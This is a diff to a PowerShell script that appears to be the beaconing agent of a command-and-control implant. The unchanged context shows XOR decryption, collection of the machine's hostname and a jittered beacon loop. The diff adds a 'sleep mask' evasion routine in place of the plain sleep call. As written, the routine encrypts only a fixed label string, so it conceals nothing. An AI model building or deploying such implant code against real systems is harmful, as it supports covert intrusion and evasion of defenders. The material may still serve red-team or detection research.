@@ -31,6 +31,27 @@ function Invoke-XORDecryption {
     return [System.Text.Encoding]::UTF8.GetString($decrypted)
 }
 
+function Invoke-SleepMask {
+    param([int]$Seconds)
+    $src = [Text.Encoding]::UTF8.GetBytes('sockpuppets-sleep-mask')
+    try {
+        $key = New-Object byte[] 32
+        $nonce = New-Object byte[] 12
+        $rng = [Security.Cryptography.RandomNumberGenerator]::Create()
+        $rng.GetBytes($key)
+        $rng.GetBytes($nonce)
+        $tag = New-Object byte[] 16
+        $ct = New-Object byte[] $src.Length
+        $aes = [Security.Cryptography.AesGcm]::new($key)
+        $aes.Encrypt($nonce, $src, $ct, $tag)
+        Start-Sleep -Seconds $Seconds
+        $out = New-Object byte[] $src.Length
+        $aes.Decrypt($nonce, $ct, $tag, $out)
+    } catch {
+        Start-Sleep -Seconds $Seconds
+    }
+}
+
 function Get-SystemMetadata {
     $metadata = @{
         hostname = $env:COMPUTERNAME
@@ -216,7 +237,7 @@ function Start-Agent {
 
             # Sleep with jitter
             $sleepTime = Get-SleepTime -BaseInterval $beaconInterval -JitterPercent $beaconJitter
-            Start-Sleep -Seconds $sleepTime
+            Invoke-SleepMask -Seconds $sleepTime
 
         } catch {
             Start-Sleep -Seconds $RECONNECT_DELAY
